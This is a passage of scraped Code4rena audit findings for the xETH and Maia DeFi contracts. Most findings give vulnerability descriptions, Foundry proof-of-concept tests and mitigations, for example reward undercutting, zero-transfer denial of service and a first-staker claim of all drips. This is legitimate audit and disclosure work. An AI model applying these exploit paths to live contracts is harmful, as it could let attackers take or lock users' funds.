(lockedFunds == 0) { 249:                 dripEnabled = false; 250:                 emit DripStopped(); 251:             } 252:  253:             /// @dev emit succesful drip event with dripAmount, lockedFunds and xETH balance 254:             emit Drip(dripAmount, lockedFunds, xETH.balanceOf(address(this))); 255:         } 256:     } ```  As we can see in the previous snippets of code, the dripping mechanism is triggered before the actual locked funds are increased, as the `_accrueDrip()` function is executed before the main body of `addLockedFunds()`. In particular, this means that line 236, which caps the drip amount to the available locked funds, is executed **before** line 154, which increases the funds.  This can lead to an undesired scenario where current stakers are not rewarded in full. To better visualize the issue, let's say the drip rate is set to 1, and X amount of funds are locked in block `b1`. Given the current conditions, funds will last for `b1 + X` blocks. Now suppose we are at block `b2` such that `b2 > b1 + X`, and the protocol owners add funds to the contract by calling `addLockedFunds()` to fulfill the rewards. Because `_accrueDrip()` is executed before, `dripAmount` will be `b2 - b1 = Y + b1 + X - b1 = Y + X` being `Y > 0` the difference of `b2` and `b1+X`. This means that `dripAmount > lockedFunds` is true, and consequently `dripAmount` gets capped to `lockedFunds`. As a conclusion, the rewards for the Y period are not paid, even though that technically funds are being added and balance should be enough to pay these rewards.  ```                X                       Y     /----------------------\\ /-------------------\\                          ==========================================================================>    ^                        ^                     ^    b1:                      b1+X                  b2    rewards are              stakers will          funds are readded    started with             only be rewarded      to the contract    X amount                 upto this block ```  Note that this can also inadvertently stop the dripping functionality. When `dripAmount` is capped at `lockedFunds`, line 241 will set `lockedFunds` to zero, which means that lines 248-251 will disable the dripping mechanism.  ## Proof of concept  The following test demonstrates the issue. Here, the drip rate is configured to be 1e18 per block and the initial amount of locked funds is 3e18. Once 5 blocks have passed, the owner refills the contract by calling `addLockedFunds()`. Even though funds are enough, Alice will receive rewards for only 3 blocks when unstaking. Note that the dripping has been disabled too.  Note: the snippet shows only the relevant code for the test. Full test file can be found [here](https://gist.github.com/romeroadrian/475d1f809301c5a0ccf2e6e9bec85472).  ```solidity function test_wxETH_UndercutRewards() public {    uint256 aliceAmount = 1e18;    uint256 deployerAmount = 100e18;    deal(address(xETH), alice, aliceAmount);    deal(address(xETH), deployer, deployerAmount);     // Deployer setups drip with 1e18 drip per block and locks 3e18 tokens    vm.startPrank(deployer);     xETH.approve(address(wxETH), type(uint256).max);     wxETH.setDripRate(1e18);    wxETH.addLockedFunds(3e18);    wxETH.startDrip();     vm.stopPrank();     // Alice stakes her xETH    vm.startPrank(alice);     xETH.approve(address(wxETH), type(uint256).max);    wxETH.stake(aliceAmount);     vm.stopPrank();     // Simulate 5 blocks ellapse    vm.roll(block.number + 5);     // Now deployers decides to refill contract    vm.prank(deployer);    wxETH.addLockedFunds(10e18);     vm.startPrank(alice);     // Alice decides to unstake    wxETH.unstake(wxETH.balanceOf(alice));     // Even though funds were available to distribute rewards for 5 blocks she only gets her initial deposit    // plus the 3e18 from only 3 blocks    assertEq(xETH.balanceOf(alice), 1e18 + 3e18);     // This also disables the dripping!    assertFalse(wxETH.dripEnabled());     vm.stopPrank(); } ```  ## Recommendation  Remove the `drip` modifier from the `addLockedFunds()` function. The call to `_accrueDrip()` is not technically needed here, and removing it will solve the issue.    ## Assessed type  Other"}, {"title": "CVXStaker cannot recover ETH", "html_url": "https://github.com/code-423n4/2023-05-xeth-findings/issues/31", "labels": ["bug", "downgraded by judge", "grade-a", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2023-05-xeth-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-xeth/blob/main/src/CVXStaker.sol#L11   # Vulnerability details  # CVXStaker cannot recover ETH  The `CVXStaker` contract contains a function to recover ERC20 tokens but fails to consider ETH.  ## Impact  The `CVXStaker` contract contains a safeguard function to recover any ERC20 token which may incorrectly be sent to the contract or missed to be considered in the integration with Convex. This is present in the function `recoverToken()`:  https://github.com/code-423n4/2023-05-xeth/blob/main/src/CVXStaker.sol#L101-L109  ```solidity 101:     function recoverToken( 102:         address token, 103:         address to, 104:         uint256 amount 105:     ) external onlyOwner { 106:         IERC20(token).safeTransfer(to, amount); 107:  108:         emit RecoveredToken(token, to, amount); 109:     } ```  However, the implementation fails to consider ETH, as the `recoverToken()` can only be used for ERC20 tokens.  ## Recommendation  ```solidity function recoverETH(address to, uint256 amount) external onlyOwner {     payable(to).transfer(amount); } ```    ## Assessed type  ETH-Transfer"}, {"title": "Zero token transfer can cause a potential DoS in CVXStaker", "html_url": "https://github.com/code-423n4/2023-05-xeth-findings/issues/30", "labels": ["bug", "2 (Med Risk)", "primary issue", "selected for report", "sponsor confirmed", "M-03"], "target": "2023-05-xeth-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-xeth/blob/main/src/CVXStaker.sol#L185-L198   # Vulnerability details  # Zero token transfer can cause a potential DoS in CVXStaker  The CVXStaker contract doesn't check for zero amount while transferring rewards, which can end up blocking the operation.  ## Impact  The CVXStaker contract is in charge of handling interaction with the Convex pool. The `getReward()` function is used to claim rewards and transfer them to the rewards recipient:  https://github.com/code-423n4/2023-05-xeth/blob/main/src/CVXStaker.sol#L185-L198  ```solidity 185:     function getReward(bool claimExtras) external { 186:         IBaseRewardPool(cvxPoolInfo.rewards).getReward( 187:             address(this), 188:             claimExtras 189:         ); 190:         if (rewardsRecipient != address(0)) { 191:             for (uint i = 0; i < rewardTokens.length; i++) { 192:                 uint256 balance = IERC20(rewardTokens[i]).balanceOf( 193:                     address(this) 194:                 ); 195:                 IERC20(rewardTokens[i]).safeTransfer(rewardsRecipient, balance); 196:             } 197:         } 198:     } ```  As we can see in the previous snippet of code, the implementation will loop all the configured reward tokens and transfer them one by one to the reward recipient.  This is a bit concerning as some ERC20 implementations revert on zero value transfers (see https://github.com/d-xo/weird-erc20#revert-on-zero-value-transfers). If at least one of the reward tokens includes this behavior, then the current implementation may cause a denial of service, as a zero amount transfer in this token will block the whole action and revert the transaction.  Note that the rewards array is not modifiable, it is defined at construction time, a token cannot be removed.  ## Proof of concept  We reproduce the issue in the following test. `token1` is a normal ERC20 and `token2` reverts on zero transfer amounts. Rewards from `token1` can't be transferred to the recipient as the zero transfer on `token2` will revert the operation.  Note: the snippet shows only the relevant code for the test. Full test file can be found [here](https://gist.github.com/romeroadrian/475d1f809301c5a0ccf2e6e9bec85472).  ```solidity function test_CVXStaker_RevertOnZeroTokenTransfer() public {     MockErc20 token1 = new MockErc20(\"Token1\", \"TOK1\", 18);     MockErc20 token2 = new RevertOnZeroErc20(\"Token2\", \"TOK2\", 18);      MockCVXRewards rewards = new MockCVXRewards();      address operator = makeAddr(\"operator\");     IERC20 clpToken = IERC20(makeAddr(\"clpToken\"));     ICVXBooster booster = ICVXBooster(makeAddr(\"booster\"));     address[] memory rewardTokens = new address[](2);     rewardTokens[0] = address(token1);     rewardTokens[1] = address(token2);      CVXStaker staker = new CVXStaker(operator, clpToken, booster, rewardTokens);     staker.setCvxPoolInfo(0, address(clpToken), address(rewards));      address rewardsRecipient = makeAddr(\"rewardsRecipient\");     staker.setRewardsRecipient(rewardsRecipient);      // simulate staker has some token1 but zero token2 after calling getRewards     deal(address(token1), address(staker), 1e18);      // The transaction will fail as the implementation will try to transfer zero     // tokens for token2, blocking the whole operation.     vm.expectRevert(\"cannot transfer zero amount\");     staker.getReward(true); } ```  ## Recommendation  Check for zero amount before executing the transfer:  ```solidity function getReward(bool claimExtras) external {     IBaseRewardPool(cvxPoolInfo.rewards).getReward(         address(this),         claimExtras     );     if (rewardsRecipient != address(0)) {         for (uint i = 0; i < rewardTokens.length; i++) {             uint256 balance = IERC20(rewardTokens[i]).balanceOf(                 address(this)             );              +           if (balance > 0) {               IERC20(rewardTokens[i]).safeTransfer(rewardsRecipient, balance); +           }         }     } } ```    ## Assessed type  ERC20"}, {"title": "Unspent allowance may break functionality in AMO", "html_url": "https://github.com/code-423n4/2023-05-xeth-findings/issues/29", "labels": ["bug", "2 (Med Risk)", "primary issue", "selected for report", "sponsor confirmed", "M-04"], "target": "2023-05-xeth-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-xeth/blob/main/src/AMO2.sol#L545 https://github.com/code-423n4/2023-05-xeth/blob/main/src/AMO2.sol#L546 https://github.com/code-423n4/2023-05-xeth/blob/main/src/AMO2.sol#L571   # Vulnerability details  # Unspent allowance may break functionality in AMO  An unspent allowance may cause a denial of service during the calls to `safeApprove()` in the AMO contract.  ## Impact  The AMO contract uses the `safeApprove()` function to grant the Curve pool permission to spend funds while adding liquidity. When adding liquidity into the Curve pool, the AMO contract needs to approve allowance so the AMM can pull tokens from the caller.  The `safeApprove()` function is a wrapper provided by the SafeERC20 library present in the OpenZeppelin contracts package, its implementation is the following:  https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/utils/SafeERC20.sol#L45-L54  ```solidity function safeApprove(IERC20 token, address spender, uint256 value) internal {     // safeApprove should only be called when setting an initial allowance,     // or when resetting it to zero. To increase and decrease it, use     // 'safeIncreaseAllowance' and 'safeDecreaseAllowance'     require(         (value == 0) || (token.allowance(address(this), spender) == 0),         \"SafeERC20: approve from non-zero to non-zero allowance\"     );     _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value)); } ``` As the comment warns, this should only be used when setting an initial balance or resetting it to zero. In the AMO contract the use of `safeApprove()` is included in the functions that are in charge of adding liquidity to the Curve pool (`addLiquidity()` and `addLiquidityOnlyStETH()`), implying a repeatedly use whenever the allowance needs to be set so that the pool can pull the funds. As we can see in the implementation, if the current allowance is not zero the function will revert.  This means that any unspent allowance of xETH or stETH (i.e. `allowance(AMO, curvePool) > 0`) will cause a denial of service in the `addLiquidity()` and `addLiquidityOnlyStETH()` functions, potentially bricking the contract.  ## Proof of concept  1. Suppose there is an unspent allowance of stETH in the AMO contract, `stETH.allowance(AMO, curvePool) > 0`. 2. Admin calls `addLiquidityOnlyStETH(stETHAmount, minLpOut)` with `stETHAmount > 0` to provide liquidity to the pool. 3. Transaction will be reverted in the call to `safeApprove()` as `(value == 0) || (token.allowance(address(this), spender) == 0)` will be false.  ## Recommendation  Simply use `approve()`, or first reset the allowance to zero using `safeApprove(spender, 0)`, or use `safeIncreaseAllowance()`.  ## Note from warden  Even though the deprecated usage of `safeApprove()` is mentioned in the automated findings, this report demonstrates how this function can cause a serious vulnerability that may end up bricking the contract.    ## Assessed type  DoS"}, {"title": "Virgin stake can claim all drops", "html_url": "https://github.com/code-423n4/2023-05-xeth-findings/issues/23", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "downgraded by judge", "judge review requested", "primary issue", "selected for report", "sponsor confirmed", "edited-by-warden", "M-05"], "target": "2023-05-xeth-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-xeth/blob/d86fe0a9959c2b43c62716240d981ae95224e49e/src/wxETH.sol#L222-L256   # Vulnerability details     ## Impact If wxETH drips when nothing is staked, then the first staker can claim every drop.  ## Proof of Concept Suppose drip is enabled when `totalSupply() == 0`. At least one block passes and the first staker stakes, just `1` xETH is enough. This mints her `1` wxETH. This also calls `_accrueDrip()` (by the `drip` modifier) which drips some amount of xETH. Note that `_accrueDrip()` is independent of `totalSupply()`, so it doesn't matter how little she stakes. `cashMinusLocked` is now `1` plus the amount dripped. Naturally, since she owns the entire supply she can immediately unstake the entire `cashMinusLocked`. Specifically, the `exchangeRate()` is now `(cashMinusLocked * BASE_UNIT) / totalSupply()` and she gets `(totalSupply() * exchangeRate()) / BASE_UNIT` = `cashMinusLocked`.  The issue is simply that drip is independent of staked amount, especially that it may drip even when nothing is staked, which enables the above attack.  ## Recommended Mitigation Steps Note what happens when `totalSupply() > 0`. Then drops will fall on existing wxETH, and any new staker will trigger a drip before having to pay the new exchange rate which includes the extra drops. So a new staker in this case cannot unstake more than they staked; all drops go to previous holders. Therefore, do not drip when `totalSupply == 0`; in `_accrueDrip()`: ```diff -if (!dripEnabled) return; +if (!dripEnabled || totalSupply() == 0) return; ```       ## Assessed type  MEV"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-05-xeth-findings/issues/20", "labels": ["bug", "grade-a", "QA (Quality Assurance)", "selected for report", "sponsor confirmed", "edited-by-warden", "Q-02"], "target": "2023-05-xeth-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-05-xeth-findings/blob/main/data/adriro-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-05-xeth-findings/issues/19", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "sponsor confirmed", "Q-03"], "target": "2023-05-xeth-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-05-xeth-findings/blob/main/data/ronnyx2017-Q.md)."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2023-05-xeth-findings/issues/11", "labels": ["bug", "grade-a", "QA (Quality Assurance)", "sponsor confirmed", "Q-04"], "target": "2023-05-xeth-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-05-xeth-findings/blob/main/data/bin2chen-Q.md)."}, {"title": "xETH.sol You can still burn without MINTER_ROLE", "html_url": "https://github.com/code-423n4/2023-05-xeth-findings/issues/10", "labels": ["bug", "disagree with severity", "downgraded by judge", "grade-a", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2023-05-xeth-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-xeth/blob/d86fe0a9959c2b43c62716240d981ae95224e49e/src/xETH.sol#L9   # Vulnerability details  ## Impact anyone can burn without MINTER_ROLE  ## Proof of Concept `xETH` we will restrict mint/burn to only those with `MINTER_ROLE` privileges The documentation is commented as follows:  ```console It has Access Control, so anyone with MINTER_ROLE can mint xETH. In this specific case, MINTER_ROLE is assigned to AMO contract. For minting / burning xETH from the Curve Pool. ``` ```solidity     function burnShares(         uint256 amount     ) public onlyRole(MINTER_ROLE) whenNotPaused {   //<------@audit only MINTER_ROLE         /// @dev if the amount to be burned is 0, revert.         if (amount == 0) revert AmountZeroProvided();         _burn(msg.sender, amount);     } ```   But currently `xETH` is `ERC20Burnable`, and there is no `MINTER_ROLE` restriction in `ERC20Burnable.burn()/burnFrom()`. Then anyone can burn, breaking this restriction rule  ```solidity contract xETH is ERC20, ERC20Burnable, Pausable, AccessControl { .... ```  ```solidity abstract contract ERC20Burnable is Context, ERC20 { ...     function burn(uint256 amount) public virtual {         _burn(_msgSender(), amount);     }     function burnFrom(address account, uint256 amount) public virtual {         _spendAllowance(account, _msgSender(), amount);         _burn(account, amount);     }     ```   ## Tools Used  ## Recommended Mitigation Steps  remove `is ERC20Burnable`   ## Assessed type  Context"}, {"title": "CVXStaker.sol Unable to process newly add rewardTokens", "html_url": "https://github.com/code-423n4/2023-05-xeth-findings/issues/8", "labels": ["bug", "2 (Med Risk)", "primary issue", "selected for report", "sponsor confirmed", "M-08"], "target": "2023-05-xeth-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-xeth/blob/d86fe0a9959c2b43c62716240d981ae95224e49e/src/CVXStaker.sol#L191-L196   # Vulnerability details  ## Impact The lack of a mechanism to modify `rewardTokens[]` If `convex` adds new `extraRewards` `CVXStaker.sol` cannot transfer the added token  ## Proof of Concept `CVXStaker.sol` will pass in `rewardTokens[]` in `constructor` and in `getReward()`, loop this array to transfer `rewardTokens`  ```solidity     function getReward(bool claimExtras) external {         IBaseRewardPool(cvxPoolInfo.rewards).getReward(             address(this),             claimExtras         );         if (rewardsRecipient != address(0)) {             for (uint i = 0; i < rewardTokens.length; i++) { //<--------@audit loop, then tranfer out                 uint256 balance = IERC20(rewardTokens[i]).balanceOf(                     address(this)                 );                 IERC20(rewardTokens[i]).safeTransfer(rewardsRecipient, balance);             }         }     } ```  The main problem is that this `rewardTokens[]` does not provide a way to modify it But it is possible to add a new `rewardsToken` in `convex`  The following code is from `BaseRewardPool.sol` of `convex`  https://github.com/convex-eth/platform/blob/main/contracts/contracts/BaseRewardPool.sol#L238  ```solidity     function addExtraReward(address _reward) external returns(bool){         require(msg.sender == rewardManager, \"!authorized\");         require(_reward != address(0),\"!reward setting\");          extraRewards.push(_reward);         return true;     } ```   This will result in a situation : if new `extraRewards` are added to `IBaseRewardPool` later on But since the `rewardTokens` of `CVXStaker` cannot be modified (e.g. added), then the new `extraRewards` cannot be transferred out of `CVXStaker`. After `IBaseRewardPool(cvxPoolInfo.rewards).getReward()`, the newly added token can only stay in the `CVXStaker` contract.  ## Tools Used  ## Recommended Mitigation Steps  Add a new method to modify`CVXStaker.rewardTokens[]`   ## Assessed type  Context"}, {"title": "withdrawAllAndUnwrap() the clpToken transfer to AMO.sol may be locked in the contract", "html_url": "https://github.com/code-423n4/2023-05-xeth-findings/issues/6", "labels": ["bug", "2 (Med Risk)", "primary issue", "selected for report", "sponsor confirmed", "M-09"], "target": "2023-05-xeth-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-xeth/blob/d86fe0a9959c2b43c62716240d981ae95224e49e/src/CVXStaker.sol#L177   # Vulnerability details  ## Impact in `withdrawAllAndUnwrap()`  the clpToken transfer to AMO.sol may be locked in the contract  ## Proof of Concept `withdrawAllAndUnwrap()` You can specify `sendToOperator==true` to transfer the `clpToken` to `operator`  The code is as follows: ```solidity     function withdrawAllAndUnwrap(         bool claim,         bool sendToOperator     ) external onlyOwner {         IBaseRewardPool(cvxPoolInfo.rewards).withdrawAllAndUnwrap(claim);         if (sendToOperator) {             uint256 totalBalance = clpToken.balanceOf(address(this));             clpToken.safeTransfer(operator, totalBalance); //<------@audit transfer to operator (AMO)         }     } ```  current protocols, `operator` is currently set to `AMO.sol` as normal  But `AMO.sol` doesn't have any way to use the transferred `clpToken` The reason is that in AMO.sol, the method that transfers the `clpToken`, the number of transfers is from the newly generated `clpToken` from `curvePool`  It doesn't include `clpToken` that already exists in `AMO.sol` contract, for example (rebalanceDown/addLiquidity/addLiquidityOnlyStETH)  example `rebalanceDown`: ```solidity     function rebalanceDown(         RebalanceDownQuote memory quote     ) ...          lpAmountOut = curvePool.add_liquidity(amounts, quote.minLpReceived);          IERC20(address(curvePool)).safeTransfer(             address(cvxStaker),             lpAmountOut //<---------@audit this clpToken from curvePool         );         cvxStaker.depositAndStake(lpAmountOut);     ```   So the `clpToken` transferred to 'AMO.sol' by `withdrawAllAndUnwrap()` will stays in the AMO contract and it is be locked.    ## Tools Used  ## Recommended Mitigation Steps  modify `withdrawAllAndUnwrap()` , directly transfer to `msg.sender`.   ## Assessed type  Context"}, {"title": "isCvxShutdown() booster shutdown but pool don't shutdown", "html_url": "https://github.com/code-423n4/2023-05-xeth-findings/issues/5", "labels": ["bug", "disagree with severity", "downgraded by judge", "grade-a", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2023-05-xeth-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-xeth/blob/d86fe0a9959c2b43c62716240d981ae95224e49e/src/CVXStaker.sol#L118   # Vulnerability details  ## Impact Missing check `booster.isShutdown==false`, may cause `deposit` to fail  ## Proof of Concept `isCvxShutdown()` is used to determine if `CVX` is shutdown  The code is as follows:  ```solidity     /**      * @dev Checks whether the CVX pool is currently shutdown.      * @return A boolean indicating whether the CVX pool is currently shutdown.      */     function isCvxShutdown() public view returns (bool) {         // It's not necessary to check that the booster itself is shutdown, as that can only         // be shutdown once all the pools are shutdown - see Cvx BoosterOwner.shutdownSystem()         return booster.poolInfo(cvxPoolInfo.pId).shutdown;     } ```  The current implementation only determines whether the pool is shutdown, and does not check whether the `booster` is shutdown The code comments explain that the execution of `BoosterOwner.shutdownSystem()` will ensure that the all pools has been shutdown  ```console         // It's not necessary to check that the booster itself is shutdown, as that can only         // be shutdown once all the pools are shutdown - see Cvx BoosterOwner.shutdownSystem() ```     But in `BoosterOwner`, it is possible to force shutdown to the booster  use `BoosterOwner.forceShutdownSystem()`, in some special cases  The following code is from BoosterOwner.sol  url: https://etherscan.io/address/0x3cE6408F923326f81A7D7929952947748180f1E6#code  ```     //queue a forced shutdown that does not require pools to already be shutdown     //this should only be needed if a pool is broken and withdrawAll() does not     //correctly return enough lp tokens     function queueForceShutdown() external onlyOwner{         require(IOwner(poolManager).isShutdown(),\"!poolMgrShutdown\");         require(!isForceTimerStarted, \"already started\");              isForceTimerStarted = true;         forceTimestamp = block.timestamp + FORCE_DELAY;          emit ShutdownStarted(forceTimestamp);     }      //force shutdown the system after timer has expired     function forceShutdownSystem() external onlyOwner{         require(isForceTimerStarted, \"!timer start\");         require(block.timestamp > forceTimestamp, \"!timer finish\");          IOwner(booster).shutdownSystem();         emit ShutdownExecuted();     } ```      `booster.shutdownSystem()` code:  https://etherscan.io/address/0xF403C135812408BFbE8713b5A23a04b3D48AAE31#code  ```solidity     //shutdown this contract.     //  unstake and pull all lp tokens to this address     //  only allow withdrawals     function shutdownSystem() external{         require(msg.sender == owner, \"!auth\");         isShutdown = true;          for(uint i=0; i < poolInfo.length; i++){             PoolInfo storage pool = poolInfo[i];             if (pool.shutdown) continue;              address token = pool.lptoken;             address gauge = pool.gauge;              //withdraw from gauge             try IStaker(staker).withdrawAll(token,gauge){                 pool.shutdown = true;             }catch{}//<-------@audit revert will shutdown == false         }     } ```  From the above code we know that if `withdrawAll()` fails, then `pool.shutdown==false` , but `booster.isShutdown==true`   To sum up, if `BoosterOwner` executes `forceShutdownSystem()` for some reason then there will still be the case: booster.shutdown == true , but pool.shutdown == false  If this happens, it will cause `isCvxShutdown() == false`, but in `CVXStaker.depositAndStake()` it will revert, because `booster.isShutdown==true`  which causes AMO2.sol not to work properly  ## Tools Used  ## Recommended Mitigation Steps  ```solidity     function isCvxShutdown() public view returns (bool) { ... -       return booster.poolInfo(cvxPoolInfo.pId).shutdown; +       return (booster.isShutdown || poolInfo(cvxPoolInfo.pId).shutdown);     }  ```   ## Assessed type  Context"}, {"title": "Analysis", "html_url": "https://github.com/code-423n4/2023-05-maia-findings/issues/916", "labels": ["grade-b", "satisfactory", "sponsor confirmed", "analysis"], "target": "2023-05-maia-findings", "body": "## A. Approach to codebase evaluation:\r Team members had individual approaches. Leader focused on UniswapV3 staking. Initial plan of brief overview followed by deep dives didn't work as intended. Collaboration was effective. Script used to find zero address checks and external functions. Codebase exploration prioritized over documentation.\r \r ## B. Key learnings:\r Team members gained knowledge of bridges and omnichain gas management. Leader learned about staking, NFT positions, gauges, and the complex contract ecosystem. Difficulty in finding vulnerabilities due to codebase size and previous audits. Importance of balancing large and small LOC contests.\r \r ## C. Comments for the judge:\r Limited focus on gas optimization. Efforts to find bugs in omnichain areas resulted in false flags. Spotting lack of zero address checks was straightforward. Time constraints and power interruption affected team leader's submission.\r \r Team members' answers:\r Approaches included light doc review, function analysis. Extensive research on contract relationships and identifying unreachable code."}, {"title": "Analysis", "html_url": "https://github.com/code-423n4/2023-05-maia-findings/issues/905", "labels": ["grade-b", "satisfactory", "sponsor confirmed", "analysis"], "target": "2023-05-maia-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-05-maia-findings/blob/main/data/0xTheC0der-Analysis.md)."}, {"title": "Although `ERC20Boost.decrementGaugesBoostIndexed` function would require user to remove all of her or his boost from a deprecated gauge at once, such user can instead call `ERC20Boost.decrementGaugeBoost` function for multiple times to utilize such deprecated gauge and decrement its `userGaugeBoost` for multiple times", "html_url": "https://github.com/code-423n4/2023-05-maia-findings/issues/904", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-01"], "target": "2023-05-maia-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-maia/blob/62f4f01a522dcbb4b9abfe2f6783bbb67c0da022/src/erc-20/ERC20Boost.sol#L175-L187 https://github.com/code-423n4/2023-05-maia/blob/62f4f01a522dcbb4b9abfe2f6783bbb67c0da022/src/erc-20/ERC20Boost.sol#L198-L200 https://github.com/code-423n4/2023-05-maia/blob/62f4f01a522dcbb4b9abfe2f6783bbb67c0da022/src/erc-20/ERC20Boost.sol#L203-L227   # Vulnerability details  ## Impact When the `gauge` input corresponds to a deprecated gauge, calling the following `ERC20Boost.decrementGaugeBoost` function can still execute `gaugeState.userGaugeBoost -= boost.toUint128()` if `boost >= gaugeState.userGaugeBoost` is false.  https://github.com/code-423n4/2023-05-maia/blob/62f4f01a522dcbb4b9abfe2f6783bbb67c0da022/src/erc-20/ERC20Boost.sol#L175-L187 ```solidity     function decrementGaugeBoost(address gauge, uint256 boost) public {         GaugeState storage gaugeState = getUserGaugeBoost[msg.sender][gauge];         if (boost >= gaugeState.userGaugeBoost) {             _userGauges[msg.sender].remove(gauge);             delete getUserGaugeBoost[msg.sender][gauge];              emit Detach(msg.sender, gauge);         } else {             gaugeState.userGaugeBoost -= boost.toUint128();              emit DecrementUserGaugeBoost(msg.sender, gauge, gaugeState.userGaugeBoost);         }     } ```  However, for the same deprecated gauge, calling the following `ERC20Boost.decrementAllGaugesBoost` and `ERC20Boost.decrementGaugesBoostIndexed` functions below would execute `_userGauges[msg.sender].remove(gauge)` and `delete getUserGaugeBoost[msg.sender][gauge]` without executing `gaugeState.userGaugeBoost -= boost.toUint128()` because `_deprecatedGauges.contains(gauge)` is true. Hence, an inconsistency exists between the `ERC20Boost.decrementGaugeBoost` and `ERC20Boost.decrementGaugesBoostIndexed` functions when the corresponding gauge is deprecated. As a result, although the `ERC20Boost.decrementGaugesBoostIndexed` function would require the user to remove all of her or his boost from a deprecated gauge at once, such user can instead call the `ERC20Boost.decrementGaugeBoost` function for multiple times to utilize such deprecated gauge and decrement its `userGaugeBoost` for multiple times if `boost >= gaugeState.userGaugeBoost` is false each time.  https://github.com/code-423n4/2023-05-maia/blob/62f4f01a522dcbb4b9abfe2f6783bbb67c0da022/src/erc-20/ERC20Boost.sol#L198-L200 ```solidity     function decrementAllGaugesBoost(uint256 boost) external {         decrementGaugesBoostIndexed(boost, 0, _userGauges[msg.sender].length());     } ```  https://github.com/code-423n4/2023-05-maia/blob/62f4f01a522dcbb4b9abfe2f6783bbb67c0da022/src/erc-20/ERC20Boost.sol#L203-L227 ```solidity     function decrementGaugesBoostIndexed(uint256 boost, uint256 offset, uint256 num) public {         address[] memory gaugeList = _userGauges[msg.sender].values();          uint256 length = gaugeList.length;         for (uint256 i = 0; i < num && i < length;) {             address gauge = gaugeList[offset + i];              GaugeState storage gaugeState = getUserGaugeBoost[msg.sender][gauge];              if (_deprecatedGauges.contains(gauge) || boost >= gaugeState.userGaugeBoost) {                 require(_userGauges[msg.sender].remove(gauge)); // Remove from set. Should never fail.                 delete getUserGaugeBoost[msg.sender][gauge];                  emit Detach(msg.sender, gauge);             } else {                 gaugeState.userGaugeBoost -= boost.toUint128();                  emit DecrementUserGaugeBoost(msg.sender, gauge, gaugeState.userGaugeBoost);             }              unchecked {                 i++;             }         }     } ```  ## Proof of Concept The following steps can occur for the described scenario. 1. Alice's 1e18 boost are attached to a gauge. 2. Such gauge becomes deprecated. 3. Alice calls the `ERC20Boost.decrementGaugeBoost` function to decrement 0.5e18 boost from such deprecated gauge. 4. Alice calls the `ERC20Boost.decrementGaugeBoost` function to decrement 0.2e18 boost from such deprecated gauge. 5. Alice still has 0.3e18 boost from such deprecated gauge so she can continue utilize and decrement boost from such deprecated gauge in the future.   ## Tools Used VSCode  ## Recommended Mitigation Steps The `ERC20Boost.decrementGaugeBoost` function can be updated to execute `require(_userGauges[msg.sender].remove(gauge))` and `delete getUserGaugeBoost[msg.sender][gauge]` if `_deprecatedGauges.contains(gauge) || boost >= gaugeState.userGaugeBoost` is true, which is similar to the `ERC20Boost.decrementGaugesBoostIndexed` function.   ## Assessed type  Other"}, {"title": "Analysis", "html_url": "https://github.com/code-423n4/2023-05-maia-findings/issues/902", "labels": ["grade-b", "satisfactory", "sponsor confirmed", "analysis-advanced", "A-01"], "target": "2023-05-maia-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-05-maia-findings/blob/main/data/Koolex-Analysis.md)."}, {"title": "Analysis", "html_url": "https://github.com/code-423n4/2023-05-maia-findings/issues/884", "labels": ["grade-b", "satisfactory", "sponsor confirmed", "analysis-advanced", "A-02"], "target": "2023-05-maia-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-05-maia-findings/blob/main/data/Evo-Analysis.md)."}, {"title": "If a STRATEGY TOKEN is \"Toggled off\" STRATEGIES will still be able to withdraw but returning of tokens with replenishReserves will be disabled.", "html_url": "https://github.com/code-423n4/2023-05-maia-findings/issues/882", "labels": ["bug", "3 (High Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "H-01"], "target": "2023-05-maia-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-omnichain/BranchPort.sol#L158-L169 https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-omnichain/BranchPort.sol#L172-L186   # Vulnerability details  ## Impact `BranchPort.manage` allows a registered Strategy to withdraw certain amounts of enabled strategy tokens. It validates access rights ie. if called by a strategy registered for the requested token.  It however doesn't check if the token itself is currently enabled.   Conversely `BranchPort.replenishTokens` allows to force withdraw managed tokens from a strategy. It however performs a check if the token is currently an active strategy token.   Strategy token may be disabled by  `toggleStrategyToken()` even if there are active strategies managing it active. In such case these strategies will still be able to withdraw the tokens with calls to `manage()` while `replenishTokens` will not be callable on them and thus tokens won't be force returnable.    ## Tools Used Pen and Paper. ## Recommended Mitigation Steps 1. Add check on enabled strategy token in `manage()` 2. Validate   `getPortStrategyTokenDebt[_strategy][_token] > 0` instead of `!isStrategyToken[_token]` in `replenishReserves()`   ## Assessed type  Access Control"}, {"title": "Analysis", "html_url": "https://github.com/code-423n4/2023-05-maia-findings/issues/880", "labels": ["grade-b", "satisfactory", "sponsor confirmed", "analysis-advanced", "A-03"], "target": "2023-05-maia-findings", "body": "See the markdown file with the details of this report 